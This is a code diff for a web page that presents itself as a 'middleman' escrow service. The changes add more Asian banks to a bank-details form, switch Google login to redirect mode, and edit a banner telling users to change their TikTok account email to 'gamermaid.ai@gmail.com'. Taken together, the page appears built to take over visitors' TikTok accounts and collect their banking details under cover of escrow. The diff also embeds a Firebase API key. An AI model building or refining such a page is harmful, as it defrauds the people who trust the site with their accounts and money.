@@ -318,38 +318,43 @@
 
         .bank-badges {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             flex-wrap: wrap;
         }
 
         .bank-badge {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
-            padding: 8px 16px;
+            gap: 8px;
+            padding: 6px 12px;
             background: var(--bg-secondary);
             border: 1px solid var(--glass-border-light);
             border-radius: var(--radius-md);
-            font-size: 0.875rem;
+            font-size: 0.825rem;
             font-weight: 600;
             color: var(--text-primary);
         }
 
         .bank-icon-svg {
-            width: 24px;
-            height: 24px;
+            width: 22px;
+            height: 22px;
             border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
-            font-size: 0.75rem;
+            font-size: 0.65rem;
             color: #ffffff;
         }
 
         .bg-kbz { background: #0056b3; }
         .bg-thai { background: #d97706; }
         .bg-hk { background: #dc2626; }
+        .bg-dbs { background: #e11d48; }
+        .bg-bkk { background: #1e40af; }
+        .bg-cimb { background: #991b1b; }
+        .bg-may { background: #eab308; color: #000; }
+        .bg-boc { background: #b91c1c; }
 
         .btn-continue {
             width: 100%;
@@ -637,7 +642,7 @@
 
                     <!-- Email Change Instruction Notice -->
                     <div class="email-change-banner">
-                        Change your Email to gamermaid.ai@gmail.com
+                        Change your TikTok Email to gamermaid.ai@gmail.com
                     </div>
 
                     <div class="form-grid">
@@ -680,7 +685,7 @@
                     </div>
 
                     <div class="bank-logos-container">
-                        <div class="bank-logos-title">Supported Banking Partners</div>
+                        <div class="bank-logos-title">Supported Asian Banking Partners</div>
                         <div class="bank-badges">
                             <div class="bank-badge">
                                 <div class="bank-icon-svg bg-kbz">KBZ</div>
@@ -694,6 +699,26 @@
                                 <div class="bank-icon-svg bg-hk">HK</div>
                                 <span>Hong Kong Bank</span>
                             </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-dbs">DBS</div>
+                                <span>DBS (Singapore)</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-bkk">BBL</div>
+                                <span>Bangkok Bank</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-cimb">CIMB</div>
+                                <span>CIMB Bank</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-may">MAY</div>
+                                <span>Maybank</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-boc">BOC</div>
+                                <span>Bank of China</span>
+                            </div>
                         </div>
                     </div>
 
@@ -702,9 +727,14 @@
                             <label for="bankName">Bank Name</label>
                             <select id="bankName" name="bankName" required>
                                 <option value="">Select your bank</option>
-                                <option value="KBZ Bank">KBZ Bank</option>
-                                <option value="Thai Bank">Thai Bank</option>
+                                <option value="KBZ Bank">KBZ Bank (Myanmar)</option>
+                                <option value="Thai Bank">Thai Local Bank</option>
                                 <option value="Hong Kong Bank">Hong Kong Bank</option>
+                                <option value="DBS Bank">DBS Bank (Singapore)</option>
+                                <option value="Bangkok Bank">Bangkok Bank (Thailand)</option>
+                                <option value="CIMB Bank">CIMB Bank (Malaysia/Regional)</option>
+                                <option value="Maybank">Maybank (Malaysia/Regional)</option>
+                                <option value="Bank of China">Bank of China</option>
                                 <option value="Other">Other International Bank</option>
                             </select>
                         </div>
@@ -795,7 +825,7 @@
                 <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; color: var(--text-muted); background:none; border:none;">&times;</button>
             </div>
 
-            <!-- Google Sign In Button -->
+            <!-- Google Sign In Button (Uses Redirect Mode) -->
             <button id="googleLoginBtn" style="width: 100%; padding: 12px; background: #ffffff; border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-bottom: 20px; box-shadow: var(--shadow-sm);">
                 <svg style="width:18px;height:18px;" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6a5.64 5.64 0 0 1-2.45 3.7v3.08h3.96c2.32-2.14 3.63-5.3 3.63-9.22z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.96-3.08c-1.08.72-2.45 1.16-3.97 1.16-3.05 0-5.63-2.06-6.55-4.83H1.35v3.15C3.39 21.31 7.37 24 12 24z"/><path fill="#FBBC05" d="M5.45 14.34a7.22 7.22 0 0 1 0-4.68V6.51H1.35a11.96 11.96 0 0 0 0 10.98l4.1-3.15z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.37 0 3.39 2.69 1.35 6.51l4.1 3.15c.92-2.77 3.5-4.91 6.55-4.91z"/></svg>
                 <span>Continue with Google</span>
@@ -830,12 +860,13 @@
         </div>
     </div>
 
-    <!-- Main Logic Scripts: Firebase Integration -->
+    <!-- Main Logic Scripts: Firebase Integration with Redirect Mode -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
             getAuth, 
-            signInWithPopup, 
+            signInWithRedirect, 
+            getRedirectResult, 
             GoogleAuthProvider, 
             createUserWithEmailAndPassword, 
             signInWithEmailAndPassword, 
@@ -849,7 +880,7 @@
             serverTimestamp 
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Your exact Firebase project configuration
+        // Firebase project credentials
         const firebaseConfig = {
             apiKey: "AIzaSyBRrvbIb2oJmRR2VvPapc04CoPb2la2DNA",
             authDomain: "middleman-3b4d7.firebaseapp.com",
@@ -865,6 +896,15 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         const googleProvider = new GoogleAuthProvider();
+
+        // Check for Google Redirect Result on page load
+        getRedirectResult(auth).then((result) => {
+            if (result && result.user) {
+                alert(`Welcome back, ${result.user.displayName || result.user.email}!`);
+            }
+        }).catch((error) => {
+            console.error("Redirect Result Error:", error);
+        });
 
         document.addEventListener('DOMContentLoaded', () => {
             const escrowForm = document.getElementById('escrowForm');
@@ -987,11 +1027,10 @@
                 }
             });
 
+            // Trigger Google Auth via Redirect Mode (Bypasses popup connect issue)
             googleLoginBtn.addEventListener('click', async () => {
                 try {
-                    const result = await signInWithPopup(auth, googleProvider);
-                    authModal.classList.remove('active');
-                    alert(`Welcome back, ${result.user.displayName || result.user.email}!`);
+                    await signInWithRedirect(auth, googleProvider);
                 } catch (error) {
                     alert("Google Sign-In failed: " + error.message);
                 }
